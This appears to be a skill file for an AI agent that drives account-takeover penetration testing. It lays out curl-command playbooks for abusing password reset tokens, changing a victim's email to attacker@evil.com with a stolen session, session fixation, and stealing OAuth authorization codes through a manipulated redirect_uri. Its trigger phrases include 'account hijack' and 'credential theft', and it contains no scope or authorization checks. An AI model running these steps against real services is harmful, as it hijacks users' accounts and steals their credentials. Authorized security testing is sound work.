---
name: vuln-account-takeover
description: "Account takeover (ATO) testing — password reset flaws, OAuth misconfig, session fixation, CSRF chain to ATO, XSS cookie theft, IDOR-based ATO, credential stuffing, email change without verification. Triggers: 'account takeover', 'ato', 'account hijack', 'session hijack', 'credential theft', 'oauth ato', 'reset token abuse', 'account compromise'."
---

# Account Takeover (ATO) Testing

Chain vulnerabilities to achieve unauthorized account access.

---

## Phase 1: Password Reset Flaws

```bash
TARGET="https://TARGET"

# Weak reset token — predictable/short:
curl -s -X POST "$TARGET/api/password/reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'
# Check if token is: sequential, short (< 20 chars), expiry > 1h, reusable

# Token not invalidated after use:
TOKEN="CAPTURED_RESET_TOKEN"
curl -s -X POST "$TARGET/api/password/change" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass123!\"}"
# Try reusing same token again:
curl -s -X POST "$TARGET/api/password/change" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\",\"password\":\"NewPass456!\"}"

# Username/email not validated in token + change pair:
# Reset for user A, use token to change user B's password
curl -s -X POST "$TARGET/api/password/change" \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"USER_A_TOKEN\",\"email\":\"userb@target.com\",\"password\":\"hacked\"}"
```

---

## Phase 2: Email Change Without Verification

```bash
TARGET="https://TARGET"
ATTACKER_EMAIL="attacker@evil.com"
SESSION="VICTIM_TOKEN_VIA_XSS_OR_OTHER"

# Change email without re-authentication or email verification:
curl -s -X PUT "$TARGET/api/account/email" \
  -H "Cookie: session=$SESSION" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$ATTACKER_EMAIL\"}"

# After email change, trigger password reset to attacker email:
curl -s -X POST "$TARGET/api/password/reset" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$ATTACKER_EMAIL\"}"
```

---

## Phase 3: Session Fixation

```bash
TARGET="https://TARGET"

# Get a pre-auth session:
FIXED_SESSION=$(curl -s -c - "$TARGET/login" | grep "session" | awk '{print $7}')

# Set victim's session via URL parameter or XSS:
# https://target.com/login?session=$FIXED_SESSION
# victim logs in with this pre-set session

# After victim logs in, use the same session:
curl -s "$TARGET/api/profile" -H "Cookie: session=$FIXED_SESSION"

# Session not rotated after login:
SESSION_BEFORE="PREAUTH_SESSION"
curl -s -X POST "$TARGET/api/login" \
  -H "Cookie: session=$SESSION_BEFORE" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'
curl -s "$TARGET/api/profile" -H "Cookie: session=$SESSION_BEFORE"
```

---

## Phase 4: OAuth-Based ATO

```bash
TARGET="https://TARGET"

# OAuth token leakage in Referer:
# If authorization code appears in URL: ?code=AUTH_CODE
# Next page has external resources → Referer header leaks code

# OAuth state CSRF:
# Missing/broken state parameter → attacker can link own OAuth account

# Open redirect in redirect_uri chain → steal authorization code:
AUTH_URL="https://auth.TARGET/oauth/authorize"
curl -s "$AUTH_URL?client_id=CLIENT_ID&redirect_uri=https://TARGET.com/callback%20@evil.com&response_type=code"
```

---

## Output

Save to `output/`:
- `ato_poc.txt` — reproduction steps for account takeover
- `ato_chain.txt` — vulnerabilities chained for ATO

## Next Phase

→ `pentest-report` to document findings with business impact
